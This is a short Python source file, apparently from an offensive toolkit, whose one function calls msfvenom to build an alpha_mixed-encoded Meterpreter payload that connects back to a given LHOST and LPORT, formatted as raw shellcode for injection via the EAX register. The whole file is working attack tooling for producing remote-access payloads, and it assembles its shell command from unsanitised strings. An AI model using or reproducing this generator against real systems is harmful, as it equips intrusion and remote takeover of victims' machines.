"""
Generates the Meterpreter payload from msfvenom
"""
import subprocess

def payloadGenerator(msfpath, msfvenom, msfpayload, ip, port, *msfopts):
  opts = ''

  for msfoption in msfopts:
    for k,v in msfoption.items():
      opts += ' ' + k + '=' + v

  payload = subprocess.Popen('ruby ' + msfpath + msfvenom + ' -p ' + msfpayload + ' LHOST=' + ip + ' LPORT=' + str(port) + opts + '  EXITFUNC=thread -e x86/alpha_mixed -f raw BufferRegister=EAX', stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
  return payload